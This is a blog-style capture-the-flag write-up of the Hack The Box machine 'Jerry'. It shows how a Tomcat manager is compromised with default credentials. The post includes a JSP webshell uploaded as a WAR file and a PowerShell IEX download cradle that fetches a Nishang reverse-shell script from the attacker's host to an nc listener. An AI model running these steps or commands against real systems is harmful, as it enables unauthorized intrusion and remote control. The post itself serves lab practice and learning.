---
layout: ../../layouts/PostLayout.astro
title:  "HTB(Jerry) Write UP No Metasploit"
date:   2019-08-12 19:37:21 -0400
categories: CTF
---
<head>
	<style>
		body {
			background-color: #161b22;
			color: #c9d1d9;
		}
		a:hover, a:visited:hover{
			color:red;
		}
		a:visited {
			color: #c9d1d9;
		}
	</style>
</head>
<h1> HTB(Jerry) Write UP No Metasploit</h1>
Quick write up on Jerry from HTB
{% highlight cmd %}
nmap -sC -sV 10.10.10.95
{% endhighlight %}

returns tomcat on 8080

<img src="/assets/img/jerrynmap.png" alt="drawing" width="450"/>

Go the 10.10.10.95:8080 and check it out, server status asks for a password. admin:admin works.
nothing too crazy there, try going to the manager app link.

<img src="/assets/img/tomcat1.png" alt="drawing" width="250"/>

admin:admin doesnt work. the 404 page says the default is tomcat:s3cret......clear your cache and that works. Also could be brute forced with hydra.
Using SecLists From github, they have wordlist specific to tomcat

<img src="/assets/img/tomcat2.png" alt="drawing" width="750"/>

If you scroll down you see you can upload war files. i think kali comes with one by default you could try. In this dir /usr/share/webshells/ but
i just googled for jsp shells and found this https://gist.github.com/nikallass/5ceef8c8c02d58ca2c69a29a92d2f461 clicked on raw,
{% highlight bash %}
curl https://gist.githubusercontent.com/nikallass/5ceef8c8c02d58ca2c69a29a92d2f461/raw/8656cc80ace93c8095b0c7d0c45b917d542fed5c/cmd.jsp > cmd.jsp
{% endhighlight %}
and was able to download it, server only allows war files, so run this in bash
{% highlight bash %}
 zip cmd.war cmd.jsp
{% endhighlight %}

upload the file, go to server:8080/cmd/cmd.jsp

and you should see this

<img src="/assets/img/jspshell.png" alt="drawing" width="750"/>

whoami shows you have code execution as system, nice.
this machine is 64 bit according to page that allows war file uploads

<img src="/assets/img/osinfo.png" alt="drawing" width="750"/>


so you have to run 64 bit powershell, googling 64 bit powershell path show this
64 bit version: C:\Windows\System32\WindowsPowerShell\v1.0\
get nishang if you dont already have it > git clone https://github.com/samratashok/nishang
use the following shell found in the nishand Shells Dir
Invoke-PowerShellTcp.ps1
edit the script to run the following function along with what port your going to be listening with netcat

<img src="/assets/img/reverse.png" alt="drawing" width="750"/>

Serve the script up with a python http server (i renamed the PS script to shell)
{% highlight python %}
python3 -m http.server 80
{% endhighlight %}
set up a netcat listener based on the port you specifed in the powershells script
{% highlight python %}
nc -lvnp 9000
{% endhighlight %}

run the following command on the java page
{% highlight cmd %}
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32:80/Shell.ps1')
{% endhighlight %}

It runs 64 bit powershell and runs that one line commmand that reads a powershell script, imports the modules and runs the function specified.

<img src="/assets/img/cmdran.png" alt="drawing" width="750"/>

You should see that after the command is run also, a GET request on your python webserver. And Last a shell on your netcat listener.

<img src="/assets/img/rootshell.png" alt="drawing" width="750"/>

<img src="/assets/img/rooted.png" alt="drawing" width="750"/>

And thats it!
